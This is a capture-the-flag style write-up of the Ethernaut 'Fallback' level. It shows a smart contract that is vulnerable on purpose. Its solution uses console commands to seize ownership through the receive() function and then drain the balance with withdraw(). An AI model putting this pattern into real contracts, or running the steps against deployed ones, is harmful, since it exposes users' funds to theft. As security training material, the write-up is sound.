# **Level 1 -- Fallback**
## **Contract to hack**
``` ts
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
`````` 
---
## ***Objectives***
* Claim ownership of the contract
* Reduce the balance to 0
---
## ***Thought Process***
There are two ways to change the owner of this contract.
* ```contribute()```
```js
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```
In order to meet the ```require(msg.value < 0.001 ether)``` condition we can only send ETH value < 0.001 in every transaction when we send eth.

The ownership can only be obtained when the amount we deposit is greater than the amount of the owner.

However according to ``` constructor() ``` the owner has 1000 eth. If we use this way to hack, we need more than 1000 ETH. It's obviously not a good method. 

---
* ```receive() ```
``` js
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
  ```
```receive()``` will be called when the contract receives ETH. So we just need to maintain our balance greater than 0 and we send one more transaction with ETH.

---
## ***Solution***
1. send 0.0001 ETH to contract.
``` js
> await contract.contribute({value: toWei("0.0001")});
```

2. send ETH to contract by using ```sendTransaction()``` function. When contract receives ETH it will call ```receive()``` function.

``` js
> await contract.sendTransaction({value: toWei("0.00001")})
```
3. now owner has become to our address and we can check this
``` js
> await contract.owner()
```
4. call ```withdraw()``` function and take away all the money
``` js 
> await contract.withdraw()
```



